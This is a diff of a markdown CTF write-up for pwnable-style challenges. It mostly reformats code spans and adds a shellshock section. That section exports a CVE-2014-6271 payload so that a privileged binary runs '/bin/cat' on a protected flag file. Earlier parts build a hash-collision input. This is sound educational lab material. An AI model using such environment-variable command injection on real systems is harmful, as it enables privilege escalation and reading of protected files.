@@ -37,16 +37,16 @@ int main(int argc, char* argv[], char* envp[]){
 }
 ```
 
-We can't just pass ```0``` as the argument, because we subtract ```hex 0x1234``` from it. So we need to supply ```0x1234``` as the first argument so that when subtracted it will equal 0.
+We can't just pass `0` as the argument, because we subtract `hex 0x1234` from it. So we need to supply `0x1234` as the first argument so that when subtracted it will equal 0.
 
-First, let's find out what ```0x1234``` is as an int.
+First, let's find out what `0x1234` is as an int.
 
 ```bash
 $ python -c "print(int(0x1234))"
 4660
 ```
 
-Great, so now all we should have to do is pass ```4660``` to the command, and then once it starts to read from STDIN we enter ```LETMEWIN\n```.
+Great, so now all we should have to do is pass `4660` to the command, and then once it starts to read from STDIN we enter `LETMEWIN\n`.
 
 ```bash
 $ ./fd 4660
@@ -88,7 +88,7 @@ There's just one final trick - each character of our second password input is XO
 // xor your input
 xor(pw_buf2, 10);
 ```
-So whatever we put in for the second password needs to be the exact opposite of the first password. That's not too difficult, we can just put in 10 ```1```'s and 10 ```0```'s.
+So whatever we put in for the second password needs to be the exact opposite of the first password. That's not too difficult, we can just put in 10 `1`'s and 10 `0`'s.
 
 ```bash
 $ ./mistake
@@ -149,7 +149,7 @@ $ python -c "print(int(0x21DD09EC))"
 568134124
 ```
 
-So we just need some password that adds up to ```568134124``` in the check_password() function.
+So we just need some password that adds up to `568134124` in the check_password() function.
 
 But.. how the hell do we do that? Let's just start off with some simple math.
 
@@ -175,7 +175,7 @@ Hmm.. this isn't equally divisible. We'll have to get fancy! Let's see what rema
 
 Okay, so we need to do ```(113626824) * 4 + 113626828```
 
-Now how the hell do we encode this as a string of characters? We can use the struct package to convert these int's to a string. But be careful, we need to encode these in little endian format (hence the ```<i```)
+Now how the hell do we encode this as a string of characters? We can use the struct package to convert these int's to a string. But be careful, we need to encode these in little endian format (hence the `<i`)
 
 ```python
 >>> import struct
@@ -189,6 +189,66 @@ So we should be able to just pass this to the command and get our flag!
 $ ./col $(python -c "import struct; print((struct.pack('<i', 113626824)*4) + struct.pack('<i', 113626828))")
 daddy! I just managed to create a hash collision :)
 ```
+
+### shellshock
+
+```c
+#include <stdio.h>
+int main(){
+    // Set real, effective, and saved user & group ID
+	setresuid(getegid(), getegid(), getegid());
+	setresgid(getegid(), getegid(), getegid());
+	
+	// Execute bash with -c
+	// If the -c option is present, then commands are read from the first 
+	// non-option argument command_string.  If there are arguments after the
+    // command_string, they are assigned to the positional parameters, 
+    // starting with $0.
+    // The command being executed is "echo shock_me".
+	system("/home/shellshock/bash -c 'echo shock_me'");
+	return 0;
+}
+```
+
+So what is shellshock? It's a bash vulnerability from 2014. Quoted from it's [Wikipedia](https://en.wikipedia.org/wiki/Shellshock_(software_bug)) page:
+> The first bug causes Bash to unintentionally execute commands when the commands are
+> concatenated to the end of function definitions stored in the values of environment 
+> variables.
+
+If we look at the [initial CVE reported on the Wikipedia page](https://en.wikipedia.org/wiki/Shellshock_(software_bug)#Initial_report_(CVE-2014-6271)) it gives us this bit of code to see if we're vulnerable.
+
+```bash
+env X='() { (a)=>\' bash -c "echo date"; cat echo
+```
+
+Lets modify this a little. Instead of doing `env` lets `export` it, and remove the trailing `cat echo`:
+```bash
+$ export x='() { :;}; echo vulnerable'
+```
+
+Now if we run `env` we should see it in the list of variables:
+```bash
+$ env | grep vuln
+x=() { :;}; echo vulnerable
+```
+
+If all works as expected, we should see "vulnerable" printed when we run the shellshock binary now:
+
+```bash
+$ ./shellshock
+vulnerable
+shock_me
+```
+
+Woohoo! What does this mean for us? Since the program runs priviledged, and the code we injected into the environment variables gets run under this priviledged execution, we should be able to just change `echo vulnerable` to `cat /home/shellshock/flag` and then when we run the shellshock binary it should print out the flag for us. It also looks like the PATH isn't set in this environment, so we have to specify the exact path to `cat`.
+
+```bash
+$ export x='() { :;}; /bin/cat /home/shellshock/flag'
+$ ./shellshock
+only if I knew CVE-2014-6271 ten years ago..!!
+Segmentation fault
+```
+
 
 ### cmd1
 ```c
